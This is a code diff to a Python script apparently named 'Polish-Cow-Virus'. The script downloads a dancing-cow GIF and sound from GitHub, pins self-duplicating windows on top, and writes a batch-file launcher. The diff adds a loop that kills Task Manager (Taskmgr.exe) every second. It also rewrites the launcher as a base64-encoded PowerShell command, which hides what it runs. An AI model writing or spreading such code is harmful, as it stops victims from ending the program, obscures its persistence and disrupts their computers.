@@ -4,6 +4,7 @@ import sys
 import shutil
 import uuid
 import random
+import base64
 
 gif_id = uuid.uuid4().hex
 mp3_id = uuid.uuid4().hex
@@ -17,6 +18,7 @@ cow_code = r'''
 import tkinter as tk
 from PIL import Image, ImageTk
 import pygame
+import psutil
 import os
 import random
 import urllib.request
@@ -28,6 +30,17 @@ mp3_path = os.path.join(folder, "{mp3_id}.mp3")
 
 gif_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
 mp3_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"
+target = "Taskmgr.exe"
+
+def kill_target():
+    for process in psutil.process_iter(["pid", "name"]):
+        try:
+            if process.info["name"] == target:
+                psutil.Process(process.info["pid"]).terminate()
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            pass
+
+    root.after(1000, kill_target)
 
 def download_file(url, path):
     if not os.path.exists(path):
@@ -93,6 +106,7 @@ def init():
     create_cow()
     animate()
     keep_top()
+    kill_target()
     root.after(10000, duplicate)
 
 
@@ -212,8 +226,14 @@ if existing_folders:
         f"{bat_id}.bat"
     )
 
+    cmd = f'"{sys.executable}" "{local_cow}"'
+    encoded = base64.b64encode(cmd.encode("utf-16le")).decode()
+
     with open(bat_path, "w") as f:
-        f.write(f'@echo off\n"{sys.executable}" "{local_cow}"')
+        f.write(
+            "@echo off\n"
+            f"powershell -NoProfile -EncodedCommand {encoded}"
+        )
 
     print("its cow time")
 else:
